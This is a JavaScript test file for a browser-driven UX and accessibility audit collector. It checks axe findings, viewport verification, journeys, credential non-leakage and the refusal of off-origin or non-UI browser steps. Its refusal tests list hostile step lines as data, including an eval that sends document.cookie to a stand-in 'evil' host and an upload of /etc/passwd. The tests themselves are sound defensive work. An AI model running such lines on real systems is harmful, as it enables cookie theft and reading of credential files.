/**
 * tests/lib/ux-grill/collect.test.mjs
 *
 * Contract tests for `scripts/lib/ux-grill/collect.mjs` driven through its ONE
 * seam to the browser — the injected `exec`. The fake returns the MEASURED
 * `agent-browser --json` envelope (v0.37.1, 2026-09-12):
 *
 *   success → {"success":true,"data":{…},"error":null}            exit 0
 *   page-side throw → {"success":false,"data":null,"error":"…"}   exit 0  (!)
 *
 * so a check that only looked at the exit code would read "0 findings" for a
 * measurement that never ran. Every `it()` below names the concrete bug it
 * catches (test-value.md TV-001); the fake also WRITES the screenshot files the
 * real browser would write, so "no capture was filed under this label" is an
 * assertion about the filesystem rather than about an un-stubbed no-op.
 */

import { describe, it, expect, afterEach, vi } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import {
  CollectError,
  DEVICE_WIDTHS,
  collect,
  findingsFromTargets,
  splitStepLine,
  assertStepArgv,
} from '../../../scripts/lib/ux-grill/collect.mjs';
import {
  OVERFLOW_EVAL,
  TARGET_SIZE_EVAL,
  VIEWPORT_WIDTH_EVAL,
  classifyTargetSize,
} from '../../../scripts/lib/ux-grill/measures.mjs';

// ---------------------------------------------------------------------------
// fixtures
// ---------------------------------------------------------------------------

/** @type {string[]} */
const tmpDirs = [];

function makeRepo() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ux-grill-collect-'));
  tmpDirs.push(dir);
  return dir;
}

afterEach(() => {
  while (tmpDirs.length > 0) {
    fs.rmSync(tmpDirs.pop(), { recursive: true, force: true });
  }
});

const BASE_URL = 'http://127.0.0.1:4311';
const RUBRIC_HASH = 'rubric-hash-abc';

/** Two axe rules violated on ONE selector — the PRD § 3 "stay two findings" AC. */
const TWO_RULES_ONE_SELECTOR = {
  counts: { violations: 2 },
  violations: [
    {
      id: 'color-contrast',
      impact: 'serious',
      help: 'Elements must have sufficient colour contrast',
      helpUrl: 'https://dequeuniversity.com/rules/axe/4.9/color-contrast',
      tags: ['wcag2aa'],
      nodeCount: 1,
      nodes: [{ target: ['#cta'], html: '<button id="cta">', failureSummary: 'fix contrast' }],
    },
    {
      id: 'button-name',
      impact: 'critical',
      help: 'Buttons must have discernible text',
      helpUrl: 'https://dequeuniversity.com/rules/axe/4.9/button-name',
      tags: ['wcag2a'],
      nodeCount: 1,
      nodes: [{ target: ['#cta'], html: '<button id="cta">', failureSummary: 'add a name' }],
    },
  ],
};

const NO_VIOLATIONS = { counts: { violations: 0 }, violations: [] };

function makeManifest(overrides = {}) {
  return {
    manifestHash: 'manifest-hash-xyz',
    frontmatter: {
      build: 'prod',
      'base-url': BASE_URL,
      viewports: [{ name: 'desktop', viewport: '1440x900' }],
      routes: [{ path: '/' }],
      journeys: [],
      personas: [],
      ...overrides,
    },
  };
}

// ---------------------------------------------------------------------------
// the ONE shared fake-exec factory
// ---------------------------------------------------------------------------

const envelope = (data) => `${JSON.stringify({ success: true, data, error: null })}\n`;
const pageThrow = (message) => `${JSON.stringify({ success: false, data: null, error: message })}\n`;

/**
 * @param {object} [opts]
 * @param {number|((args: string[]) => number)} [opts.innerWidth] measured `window.innerWidth`
 * @param {(name: string) => number} [opts.setDeviceCode] exit code of `set device <name>`
 * @param {(url: string) => number} [opts.openCode] exit code of `open <url>`
 * @param {object|'page-throw'} [opts.axe]
 * @param {object|'page-throw'|'unparseable'} [opts.targets]
 * @param {object} [opts.overflow]
 * @param {string} [opts.title]
 * @param {number} [opts.errorsCode] exit code of `errors --json`
 * @param {string[]} [opts.pageErrors]
 * @param {(stepsDone: number) => string} [opts.journeyUrl] URL reported after N journey steps
 * @param {number} [opts.sessionProbeCode]
 */
function makeExec(opts = {}) {
  const calls = [];
  let stepsDone = 0;
  const innerWidth = opts.innerWidth ?? 1440;

  const exec = async (args) => {
    calls.push([...args]);
    const [a0, a1] = args;

    if (a0 === 'session' && a1 === 'id') {
      return { stdout: '', stderr: '', code: opts.sessionProbeCode ?? 1 };
    }
    if (a0 === 'close') return { stdout: '', stderr: '', code: 0 };

    if (a0 === 'set' && a1 === 'viewport') return { stdout: '', stderr: '', code: 0 };
    if (a0 === 'set' && a1 === 'device') {
      const code = opts.setDeviceCode ? opts.setDeviceCode(String(args[2])) : 0;
      return { stdout: '', stderr: code === 0 ? '' : 'Supported: iPhone 15, …', code };
    }

    if (a0 === 'open') {
      const code = opts.openCode ? opts.openCode(String(a1)) : 0;
      return { stdout: '', stderr: '', code };
    }

    if (a0 === 'errors' && a1 === '--clear') return { stdout: '', stderr: '', code: 0 };
    if (a0 === 'errors') {
      const code = opts.errorsCode ?? 0;
      if (code !== 0) return { stdout: '', stderr: 'daemon gone', code };
      return { stdout: envelope({ errors: opts.pageErrors ?? [] }), stderr: '', code: 0 };
    }

    if (a0 === 'get' && a1 === 'title') {
      return { stdout: envelope({ title: opts.title ?? 'Home' }), stderr: '', code: 0 };
    }
    if (a0 === 'get' && a1 === 'url') {
      const url = opts.journeyUrl ? opts.journeyUrl(stepsDone) : `${BASE_URL}/`;
      return { stdout: envelope({ url }), stderr: '', code: 0 };
    }
    if (a0 === 'get' && a1 === 'text') return { stdout: '', stderr: '', code: 0 };

    if (a0 === 'a11y') {
      const axe = opts.axe ?? NO_VIOLATIONS;
      if (axe === 'page-throw') return { stdout: pageThrow('axe injection failed'), stderr: '', code: 0 };
      return { stdout: envelope(axe), stderr: '', code: 0 };
    }

    if (a0 === 'eval') {
      const script = String(a1);
      if (script === VIEWPORT_WIDTH_EVAL) {
        const w = typeof innerWidth === 'function' ? innerWidth(args) : innerWidth;
        return { stdout: envelope({ result: w }), stderr: '', code: 0 };
      }
      if (script === TARGET_SIZE_EVAL) {
        const targets = opts.targets ?? { targets: [], scanned: 0, truncated: false };
        if (targets === 'page-throw') return { stdout: pageThrow('eval threw'), stderr: '', code: 0 };
        if (targets === 'unparseable') return { stdout: 'Executing…\nnot json <<<\n', stderr: '', code: 0 };
        return { stdout: envelope({ result: targets }), stderr: '', code: 0 };
      }
      if (script === OVERFLOW_EVAL) {
        const overflow = opts.overflow ?? { scrollWidth: 1440, innerWidth: 1440, bodyScrollWidth: 1440 };
        return { stdout: envelope({ result: overflow }), stderr: '', code: 0 };
      }
      return { stdout: envelope({ result: null }), stderr: '', code: 0 };
    }

    if (a0 === 'screenshot') {
      fs.writeFileSync(String(a1), 'PNG-STUB', 'utf8');
      return { stdout: '', stderr: '', code: 0 };
    }

    // Anything else is a journey step (click/fill/type/…).
    stepsDone += 1;
    return { stdout: '', stderr: '', code: 0 };
  };

  exec.calls = calls;
  return exec;
}

const run = (repoRoot, manifest, exec, extra = {}) =>
  collect({
    repoRoot,
    manifest,
    envMap: new Map(),
    rubricHash: RUBRIC_HASH,
    exec,
    runId: '1757635200000-aaaaaa',
    now: () => new Date('2026-09-12T10:00:00.000Z'),
    ...extra,
  });

/** Every file under `dir`, as `[relativePath, utf8Content]`. */
function readTree(dir) {
  const out = [];
  for (const entry of fs.readdirSync(dir, { withFileTypes: true, recursive: true })) {
    const abs = path.join(entry.parentPath ?? entry.path, entry.name);
    if (entry.isFile()) out.push([abs, fs.readFileSync(abs, 'utf8')]);
  }
  return out;
}

// ---------------------------------------------------------------------------
// 1 — axe fan-out
// ---------------------------------------------------------------------------

describe('collect() — axe findings', () => {
  it('emits one finding per axe RULE when two rules are violated on the same selector', async () => {
    const repoRoot = makeRepo();
    const result = await run(repoRoot, makeManifest(), makeExec({ axe: TWO_RULES_ONE_SELECTOR }));

    const axeFindings = result.findings.filter((f) => f.checkId.startsWith('axe-'));
    expect(axeFindings).toHaveLength(2);
    expect(axeFindings.map((f) => f.checkId).sort()).toEqual(['axe-button-name', 'axe-color-contrast']);
    expect(axeFindings.map((f) => f.locator)).toEqual(['/|desktop|#cta', '/|desktop|#cta']);
    expect(new Set(axeFindings.map((f) => f.fingerprint)).size).toBe(2);
    expect(axeFindings.map((f) => f.severity).sort()).toEqual(['high', 'high']);
  });
});

// ---------------------------------------------------------------------------
// 2 — determinism
// ---------------------------------------------------------------------------

describe('collect() — determinism', () => {
  it('writes byte-identical findings.jsonl for two runs with different runId and clock', async () => {
    const repoRoot = makeRepo();
    const manifest = makeManifest();
    const execOpts = { axe: TWO_RULES_ONE_SELECTOR, overflow: { scrollWidth: 1600, innerWidth: 1440, bodyScrollWidth: 1600 } };

    const first = await run(repoRoot, manifest, makeExec(execOpts), {
      runId: '1757635200000-aaaaaa',
      now: () => new Date('2026-09-12T10:00:00.000Z'),
    });
    const second = await run(repoRoot, manifest, makeExec(execOpts), {
      runId: '1900000000000-bbbbbb',
      now: () => new Date('2027-01-31T23:59:59.000Z'),
    });

    const firstText = fs.readFileSync(path.join(first.runDir, 'findings.jsonl'), 'utf8');
    const secondText = fs.readFileSync(path.join(second.runDir, 'findings.jsonl'), 'utf8');

    expect(firstText.length).toBeGreaterThan(0);
    expect(secondText).toBe(firstText);
    expect(firstText).not.toContain('1757635200000-aaaaaa');
    expect(firstText).not.toContain('1900000000000-bbbbbb');
    expect(firstText).not.toContain(repoRoot);
    expect(firstText).not.toContain('2026-09-12T10:00:00.000Z');
    expect(/\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}/.test(firstText)).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// 3 — viewport verification
// ---------------------------------------------------------------------------

describe('collect() — viewport verification', () => {
  it('skips the viewport and files NO capture under its label when the measured width contradicts the device', async () => {
    const repoRoot = makeRepo();
    const manifest = makeManifest({ viewports: [{ name: 'mobile', device: 'iPhone 15' }] });
    // `set device` reports success while the page still measures the desktop width.
    const result = await run(repoRoot, manifest, makeExec({ innerWidth: 1440 }));

    expect(DEVICE_WIDTHS['iPhone 15']).toBe(393);
    expect(result.skipped).toEqual([{ what: 'viewport:mobile', reason: 'device-mismatch' }]);
    expect(result.findings).toEqual([]);
    const shots = fs.readdirSync(path.join(result.runDir, 'screenshots'));
    expect(shots.filter((name) => name.includes('mobile'))).toEqual([]);
    expect(result.runRecord.viewports).toEqual([]);
  });

  it('skips an unknown device name whose `set device` exits non-zero', async () => {
    const repoRoot = makeRepo();
    const manifest = makeManifest({ viewports: [{ name: 'retro', device: 'Nokia 3310' }] });
    const result = await run(
      repoRoot,
      manifest,
      makeExec({ setDeviceCode: (name) => (name in DEVICE_WIDTHS ? 0 : 1) }),
    );

    expect(result.skipped).toEqual([{ what: 'viewport:retro', reason: 'device-mismatch' }]);
    expect(result.findings).toEqual([]);
  });

  it('skips an unlisted device with no expected-width even as the FIRST viewport (F2: no expectation is a mismatch, never an accept)', async () => {
    const repoRoot = makeRepo();
    // The fake ACCEPTS the device (exit 0) so the only reason left to skip is
    // "no expectation exists" — the branch the wave-1 defect accepted blindly,
    // and which as the first viewport has no previous width to differ from.
    const manifest = makeManifest({ viewports: [{ name: 'retro', device: 'Nokia 3310' }] });
    const result = await run(repoRoot, manifest, makeExec({ innerWidth: 240 }));

    expect(DEVICE_WIDTHS['Nokia 3310']).toBeUndefined();
    expect(result.skipped).toEqual([{ what: 'viewport:retro', reason: 'device-mismatch' }]);
    expect(result.findings).toEqual([]);
    expect(fs.readdirSync(path.join(result.runDir, 'screenshots'))).toEqual([]);
  });

  it('runs the viewport when the measured width matches the explicit expected-width', async () => {
    const repoRoot = makeRepo();
    const manifest = makeManifest({ viewports: [{ name: 'retro', device: 'Nokia 3310', 'expected-width': 240 }] });
    const result = await run(repoRoot, manifest, makeExec({ innerWidth: 240 }));

    expect(result.skipped).toEqual([]);
    expect(result.runRecord.viewports).toEqual(['retro']);
  });
});

// ---------------------------------------------------------------------------
// 4 — measure-failed skips (F4)
// ---------------------------------------------------------------------------

describe('collect() — a failed measurement is a skip, never a silent zero', () => {
  it.each([
    // Folded in the former standalone "files zero axe findings AND a
    // measure-failed skip..." test via this row's extraAssert: same input
    // (`axe: 'page-throw'`), same bug — a leak of a spurious axe finding
    // alongside the skip would slip past the generic rows below but not here.
    ['a11y answers success:false at exit 0', { axe: 'page-throw' }, '/|desktop|a11y', (result) => {
      expect(result.skipped).toEqual([{ what: '/|desktop|a11y', reason: 'measure-failed' }]);
      expect(result.findings.filter((f) => f.checkId.startsWith('axe-'))).toEqual([]);
    }],
    ['the target-size eval prints unparseable stdout', { targets: 'unparseable' }, '/|desktop|eval:target-size', () => {}],
    ['errors --json exits non-zero', { errorsCode: 1 }, '/|desktop|errors', () => {}],
  ])('records %s as measure-failed', async (_label, execOpts, expectedWhat, extraAssert) => {
    const repoRoot = makeRepo();
    const result = await run(repoRoot, makeManifest(), makeExec(execOpts));

    expect(result.skipped).toContainEqual({ what: expectedWhat, reason: 'measure-failed' });
    expect(result.runRecord.skipped).toContainEqual({ what: expectedWhat, reason: 'measure-failed' });
    extraAssert(result);
  });

  it('records NO skip when every payload is healthy (positive control)', async () => {
    const repoRoot = makeRepo();
    const result = await run(repoRoot, makeManifest(), makeExec({ axe: TWO_RULES_ONE_SELECTOR }));

    expect(result.skipped).toEqual([]);
    expect(result.runRecord.routes).toEqual(['/']);
  });
});

// ---------------------------------------------------------------------------
// 5 — journeys
// ---------------------------------------------------------------------------

const JOURNEY_MANIFEST = (overrides = {}) =>
  makeManifest({
    journeys: [
      {
        name: 'checkout',
        start: '/cart',
        'max-steps': 2,
        success: 'done',
        steps: ['click @a', 'click @b', 'click @c', 'click @d'],
        ...overrides,
      },
    ],
  });

describe('collect() — journeys', () => {
  it('files journey-step-count when success is reached after more steps than max-steps', async () => {
    const repoRoot = makeRepo();
    const result = await run(
      repoRoot,
      JOURNEY_MANIFEST(),
      makeExec({ journeyUrl: (steps) => (steps >= 3 ? `${BASE_URL}/done` : `${BASE_URL}/cart`) }),
    );

    const journeyFindings = result.findings.filter((f) => f.locator.startsWith('journey|'));
    expect(journeyFindings).toHaveLength(1);
    expect(journeyFindings[0].checkId).toBe('journey-step-count');
    expect(journeyFindings[0].severity).toBe('medium');
    expect(journeyFindings[0].locator).toBe('journey|desktop|checkout');
    expect(journeyFindings[0].evidence.stepsRun).toBe(3);
    expect(journeyFindings[0].evidence.maxSteps).toBe(2);
  });

  it('files journey-failed at high severity when the success condition is never reached', async () => {
    const repoRoot = makeRepo();
    const result = await run(
      repoRoot,
      JOURNEY_MANIFEST(),
      makeExec({ journeyUrl: () => `${BASE_URL}/cart` }),
    );

    const journeyFindings = result.findings.filter((f) => f.locator.startsWith('journey|'));
    expect(journeyFindings).toHaveLength(1);
    expect(journeyFindings[0].checkId).toBe('journey-failed');
    expect(journeyFindings[0].severity).toBe('high');
    expect(journeyFindings[0].evidence.stepsRun).toBe(4);
  });

  it('skips the journey as route-unreachable — and files NO journey-failed — when its start page never opens (F10)', async () => {
    const repoRoot = makeRepo();
    const result = await run(
      repoRoot,
      JOURNEY_MANIFEST(),
      makeExec({ openCode: (url) => (url.endsWith('/cart') ? 1 : 0) }),
    );

    expect(result.skipped).toEqual([{ what: 'journey:checkout', reason: 'route-unreachable' }]);
    expect(result.findings.filter((f) => f.locator.startsWith('journey|'))).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// 6 — secrets
// ---------------------------------------------------------------------------

describe('collect() — persona credentials', () => {
  it('passes the password through argv ONLY — never into an artefact, a finding or the ledger', async () => {
    const repoRoot = makeRepo();
    const PASSWORD = 'hunter2-NEVER-ON-DISK-9f3a01';
    const EMAIL = 'persona-user@example.invalid';
    const manifest = makeManifest({
      personas: [{ name: 'shopper', 'login-env-email': 'LOGIN_EMAIL', 'login-env-password': 'LOGIN_PASSWORD' }],
      journeys: [
        {
          name: 'login',
          start: '/login',
          'max-steps': 4,
          success: 'dashboard',
          persona: 'shopper',
          steps: ['fill #email ${LOGIN_EMAIL}', 'fill #pw ${LOGIN_PASSWORD}', 'click @submit'],
        },
      ],
    });
    const exec = makeExec({ journeyUrl: (steps) => (steps >= 3 ? `${BASE_URL}/dashboard` : `${BASE_URL}/login`) });

    await run(repoRoot, manifest, exec, {
      envMap: new Map([
        ['LOGIN_EMAIL', EMAIL],
        ['LOGIN_PASSWORD', PASSWORD],
      ]),
    });

    // The argv IS the intended channel.
    const argvWithSecret = exec.calls.filter((args) => args.includes(PASSWORD));
    expect(argvWithSecret).toHaveLength(1);
    expect(argvWithSecret[0].slice(0, 2)).toEqual(['fill', '#pw']);

    // Nothing under the repo root may carry it — artefacts, findings, ledger.
    const leaking = readTree(repoRoot).filter(([, text]) => text.includes(PASSWORD) || text.includes(EMAIL));
    expect(leaking.map(([file]) => path.relative(repoRoot, file))).toEqual([]);

    const ledger = fs.readFileSync(path.join(repoRoot, '.orchestrator/metrics/ux-grill.jsonl'), 'utf8');
    expect(ledger).not.toContain(PASSWORD);
    expect(ledger).not.toContain(EMAIL);
  });

  // Bug (#1335): String#replace substituted only the FIRST placeholder per
  // token, and its string replacement expanded `$&` / `$'` — so a password
  // holding those patterns reached the browser mangled and the login failed.
  it('substitutes every placeholder in a token, inserting `$` patterns literally', async () => {
    const repoRoot = makeRepo();
    const PASSWORD = "p$&w$'d$$-9f3a01";
    const manifest = makeManifest({
      personas: [{ name: 'shopper', 'login-env-email': 'LOGIN_EMAIL', 'login-env-password': 'LOGIN_PASSWORD' }],
      journeys: [
        {
          name: 'login',
          start: '/login',
          'max-steps': 2,
          success: 'dashboard',
          persona: 'shopper',
          steps: ['fill #pw ${LOGIN_PASSWORD}|${LOGIN_PASSWORD}'],
        },
      ],
    });
    const exec = makeExec({ journeyUrl: () => `${BASE_URL}/login` });

    await run(repoRoot, manifest, exec, {
      envMap: new Map([
        ['LOGIN_EMAIL', 'persona-user@example.invalid'],
        ['LOGIN_PASSWORD', PASSWORD],
      ]),
    });

    const fill = exec.calls.find((args) => args[0] === 'fill' && args[1] === '#pw');
    expect(fill?.[2]).toBe(`${PASSWORD}|${PASSWORD}`);
  });
});

// ---------------------------------------------------------------------------
// 7 — off-origin refusal (F1)
// ---------------------------------------------------------------------------

describe('collect() — off-origin refusal', () => {
  it('refuses a journey start on a foreign host BEFORE opening anything, without naming the host', async () => {
    const repoRoot = makeRepo();
    const manifest = makeManifest({
      journeys: [{ name: 'steal', start: 'http://evil.example.com/steal', 'max-steps': 1, success: 'ok', steps: ['click @a'] }],
    });
    const exec = makeExec();

    const error = await run(repoRoot, manifest, exec).then(
      () => null,
      (caught) => caught,
    );

    expect(error).toBeInstanceOf(CollectError);
    expect(error.code).toBe('journey-start-off-origin');
    expect(error.message).not.toContain('evil.example.com');
    expect(exec.calls.filter((args) => args[0] === 'open')).toEqual([]);
  });

  it('refuses a route path on a different loopback PORT — loopback is not the predicate, origin equality is', async () => {
    const repoRoot = makeRepo();
    const manifest = makeManifest({ routes: [{ path: 'http://127.0.0.1:9999/' }] });
    const exec = makeExec();

    const error = await run(repoRoot, manifest, exec).then(
      () => null,
      (caught) => caught,
    );

    expect(error).toBeInstanceOf(CollectError);
    expect(error.code).toBe('route-path-off-origin');
    expect(exec.calls.filter((args) => args[0] === 'open')).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// 8 — --session ban (F12)
// ---------------------------------------------------------------------------

describe('collect() — session isolation', () => {
  it('refuses a journey step that retargets the session', async () => {
    const repoRoot = makeRepo();
    const manifest = makeManifest({
      journeys: [{ name: 'hijack', start: '/', 'max-steps': 1, success: 'ok', steps: ['type "x" --session other'] }],
    });
    const exec = makeExec();

    const error = await run(repoRoot, manifest, exec).then(
      () => null,
      (caught) => caught,
    );

    expect(error).toBeInstanceOf(CollectError);
    expect(error.code).toBe('step-session-override');
    expect(exec.calls.filter((args) => args[0] === 'open')).toEqual([]);
  });

  it('refuses the `--session=name` spelling too', () => {
    expect(() => splitStepLine('type "x" --session=other')).toThrow(CollectError);
  });

  // Bug (HIGH-1): before the allowlist, splitStepLine refused exactly ONE token
  // (`--session`) and collect() ran the rest of the argv verbatim — so a
  // manifest, a YAML data file, was an unrestricted agent-browser surface. Each
  // line below was measured ACCEPTED on 2026-09-12: host-file READ (`upload`,
  // `cookies set --curl`), host-file WRITE (`download`, `pdf`), off-origin
  // exfil (`eval`), foreign-browser retarget (`connect`) and a machine-wide
  // session kill (`close --all`). None reaches the destructive-command guard:
  // defaultExec spawns with shell:false, so no step argv ever touches Bash.
  it.each([
    'upload input[type=file] /etc/passwd',
    'download a#x /tmp/pwned',
    'pdf /tmp/x.pdf',
    'connect 9222',
    "eval fetch('http://evil/?c='+document.cookie)",
    'cookies set --curl /tmp/c.json',
    'close --all',
    'screenshot /tmp/x.png',
  ])('refuses the non-UI step verb in %s', (line) => {
    let error;
    try {
      assertStepArgv(splitStepLine(line), { baseUrl: 'http://127.0.0.1:3100' });
    } catch (err) {
      error = err;
    }
    expect(error).toBeInstanceOf(CollectError);
    expect(error.code).toBe('step-verb-not-allowed');
  });

  it.each([
    'click "New document"',
    'type "#title" "Placeholder"',
    'open /dashboard',
    'open http://127.0.0.1:3100/dashboard',
    'get text body',
    'wait 250',
  ])('keeps the allowed UI vocabulary working: %s', (line) => {
    expect(() => assertStepArgv(splitStepLine(line), { baseUrl: 'http://127.0.0.1:3100' })).not.toThrow();
  });

  // Bug: `open` was the one allowlisted verb that could still walk the run —
  // and a persona's substituted password — onto a foreign page, because the
  // same-origin check existed only for `routes[].path` and `journeys[].start`.
  it('refuses an off-origin `open` step without echoing the URL', () => {
    let error;
    try {
      assertStepArgv(splitStepLine('open http://evil.example/steal'), { baseUrl: 'http://127.0.0.1:3100' });
    } catch (err) {
      error = err;
    }
    expect(error).toBeInstanceOf(CollectError);
    expect(error.code).toBe('step-open-off-origin');
    expect(error.message).not.toContain('evil.example');
  });

  // Bug: a guard whose predicate is optional is not a guard — a caller that
  // forgot baseUrl would have silently skipped the origin half.
  it('requires baseUrl rather than degrading to a verb-only check', () => {
    expect(() => assertStepArgv(['open', '/x'], {})).toThrow(TypeError);
  });

  it('aborts the whole run before opening a browser when a step verb is refused', async () => {
    const repoRoot = makeRepo();
    const manifest = makeManifest({
      journeys: [{ name: 'exfil', start: '/', 'max-steps': 1, success: 'ok', steps: ['pdf /tmp/x.pdf'] }],
    });
    const exec = makeExec();

    const error = await run(repoRoot, manifest, exec).then(
      () => null,
      (caught) => caught,
    );

    expect(error).toBeInstanceOf(CollectError);
    expect(error.code).toBe('step-verb-not-allowed');
    expect(exec.calls.filter((args) => args[0] === 'open')).toEqual([]);
  });

  it('appends its own --session LAST, exactly once, to every browser call of a healthy run', async () => {
    const repoRoot = makeRepo();
    const exec = makeExec({ axe: TWO_RULES_ONE_SELECTOR });
    await run(repoRoot, JOURNEY_MANIFEST(), exec, {});

    // The `session id` probe is the one call made before a session name exists.
    const probes = exec.calls.filter((args) => args[0] === 'session');
    expect(probes).toHaveLength(1);

    const browserCalls = exec.calls.filter((args) => args[0] !== 'session');
    expect(browserCalls.length).toBeGreaterThan(10);
    for (const args of browserCalls) {
      expect(args.filter((token) => token === '--session')).toHaveLength(1);
      expect(args.at(-2)).toBe('--session');
      expect(args.at(-1)).toBe(`uxgrill-${path.basename(repoRoot)}-1757635200000-aaaaaa`);
    }
  });
});

// ---------------------------------------------------------------------------
// 9 — envMap contract (F3)
// ---------------------------------------------------------------------------

describe('collect() — envMap contract', () => {
  it('rejects a plain object envMap with a TypeError instead of silently reading no credentials', async () => {
    const repoRoot = makeRepo();
    const error = await run(repoRoot, makeManifest(), makeExec(), {
      envMap: { LOGIN_PASSWORD: 'x' },
    }).then(
      () => null,
      (caught) => caught,
    );

    expect(error).toBeInstanceOf(TypeError);
    expect(error.message).toMatch(/envMap must be a Map/);
  });
});

// ---------------------------------------------------------------------------
// 10 — findingsFromTargets payload shapes
// ---------------------------------------------------------------------------

describe('findingsFromTargets()', () => {
  const CTX = { route: '/', viewport: 'desktop', build: 'prod', classify: classifyTargetSize };
  const BOX = { selector: '#tiny', tag: 'button', width: 18, height: 18 };

  it.each([
    ['an object with scanned/truncated metadata', { targets: [BOX], scanned: 200, truncated: true }, (findings) => {
      expect(findings[0].evidence.truncated).toBe(true);
      expect(findings[0].evidence.width).toBe(18);
    }],
    ['a bare array', [BOX], (findings) => expect('truncated' in findings[0].evidence).toBe(false)],
  ])('accepts %s as targets input', (_label, input, extraAssert) => {
    const findings = findingsFromTargets(input, CTX);
    expect(findings).toHaveLength(1);
    expect(findings[0].checkId).toBe('target-size-floor');
    extraAssert(findings);
  });

  it('throws measures-unavailable rather than inventing thresholds when no classifier is reachable', async () => {
    vi.resetModules();
    const fresh = await import('../../../scripts/lib/ux-grill/collect.mjs?fresh-classifier');
    let caught = null;
    try {
      fresh.findingsFromTargets([BOX], { route: '/', viewport: 'desktop', build: 'prod' });
    } catch (error) {
      caught = error;
    }
    expect(caught).toBeInstanceOf(fresh.CollectError);
    expect(caught.code).toBe('measures-unavailable');
  });
});

// ---------------------------------------------------------------------------
// 11 — base-url-unreachable vs route-unreachable
// ---------------------------------------------------------------------------

describe('collect() — unreachable routes', () => {
  it('throws base-url-unreachable when the very FIRST open fails', async () => {
    const repoRoot = makeRepo();
    const error = await run(repoRoot, makeManifest(), makeExec({ openCode: () => 1 })).then(
      () => null,
      (caught) => caught,
    );

    expect(error).toBeInstanceOf(CollectError);
    expect(error.code).toBe('base-url-unreachable');
  });

  it('records a LATER failing route as a route-unreachable skip without throwing', async () => {
    const repoRoot = makeRepo();
    const manifest = makeManifest({ routes: [{ path: '/' }, { path: '/broken' }] });
    const result = await run(repoRoot, manifest, makeExec({ openCode: (url) => (url.endsWith('/broken') ? 1 : 0) }));

    expect(result.skipped).toEqual([{ what: 'route:/broken|desktop', reason: 'route-unreachable' }]);
    expect(result.runRecord.routes).toEqual(['/']);
  });
});
